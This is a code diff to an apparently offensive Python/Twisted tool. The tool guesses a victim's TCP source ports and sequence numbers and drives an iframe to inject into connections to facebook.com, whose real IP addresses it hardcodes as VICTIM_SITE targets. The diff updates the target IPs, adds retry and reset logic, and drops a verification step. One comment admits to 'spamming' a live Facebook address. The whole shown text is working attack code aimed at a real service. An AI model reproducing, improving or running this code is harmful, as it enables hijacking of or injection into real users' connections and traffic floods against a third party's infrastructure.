@@ -71,12 +71,13 @@ TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_SITE = '69.171.228.74'
 #VICTIM_DOMAIN = 'www.facebook.com' # TTL = 30
 
-VICTIM_SITE = '66.220.149.11'
+#VICTIM_SITE = '66.220.149.11' #OOPSS!! sorry for spamming this after facebook.com no longer pointed to it...
+VICTIM_SITE = '66.220.149.88'
 VICTIM_DOMAIN = 'facebook.com' # TTL = 7200, but there are 5 of them
 
 # TODO: loop over all these to figure out which one we are during port
 # guessing...
-VICTIM_SITE_IPS = ['66.220.149.11', '66.220.158.11', '69.171.224.37', \
+VICTIM_SITE_IPS = ['66.220.149.88', '66.220.158.11', '69.171.224.37', \
                     '69.171.229.11', '69.171.242.11']
 
 NEW_CONNECTION_PERIOD = 0.4
@@ -177,11 +178,21 @@ class ControlWebSocket(Protocol):
         self.transport.write('iframe')
         if (self.spewer_pid == None):
             self.spawnHTTPSpewer() 
-        reactor.callLater(0.5, self.make_iframe)
+        if (time.time() - self.last_init_iframe) < 60:
+            reactor.callLater(0.5, self.make_iframe)
+        else:
+            # reset the whole thing, try again
+            self.bucket = 0
+            self.bucket_search = True
+            self.state = STATE_SOURCE_PORT_GUESS
+            self.seq_spew_port = None
+            self.killSpewer()
+
+            reactor.callLater(1, self.fireAgain)
 
     def init_iframe(self):
         self.transport.write("init_iframe http://%s" % (VICTIM_DOMAIN))
-                        
+        self.last_init_iframe = time.time()                
         reactor.callLater(1, self.make_iframe)
 
 
@@ -216,37 +227,14 @@ class ControlWebSocket(Protocol):
                     self.max_port = int(self.min_port) + 40
                     self.mid_port = int(self.min_port) + 20
                 return
+
             print 'Found port %d used for %s' % (port, VICTIM_SITE_IPS[self.ip_guess_index])
             self.transport.write("Found port <b>%d</b> for %s" % (port, VICTIM_SITE_IPS[self.ip_guess_index])) 
-            print 'Checking if %s matches %s...' % (VICTIM_SITE_IPS[self.ip_guess_index], VICTIM_DOMAIN)
-            self.state = STATE_IP_DOUBLE_CHECK
-            self.min_port = int(port) + 5
-            self.mid_port = self.min_port
-            self.max_port = self.min_port
 
-            self.wrong_final_count = 0
-
-            return
-        elif (self.state == STATE_IP_DOUBLE_CHECK):
-            if success:
-                port = self.min_port
-            else:
-                self.wrong_final_count += 1
-                if (self.wrong_final_count >= 5):
-                    self.state = STATE_SOURCE_PORT_GUESS
-                    self.bucket = 0
-                    self.bucket_search = True
-                    print 'Sorry, looks like %s was not %s...try again' \
-                            % (VICTIM_DOMAIN, VICTIM_SITE_IPS[self.ip_guess_index])
-                return
-            
-            print 'It was totally it!!!'
-            reactor.callLater(1, self.init_iframe)
             self.seq_spew_port = port + 1
+            reactor.callLater(1, self.init_iframe)
 
-            #reactor.stop()
             return
-
 
         if success:
             # Look left
@@ -269,6 +257,11 @@ class ControlWebSocket(Protocol):
             #self.mid_port += 1
             #self.max_port += 1
 
+        # When we reach a small enough guessing range, it makes less sense to do
+        # binary search, and just guess a single value until we get a hit
+        # (5 is probably not the right number, we could make some models and
+        # figure out what the optimal number is given our flavor of binary search,
+        # but i'll optimize when i'm dead)
         if (self.max_port - self.min_port) < 5:
             print 'Starting to just guess %d' % self.max_port
             self.min_port = self.mid_port = self.max_port
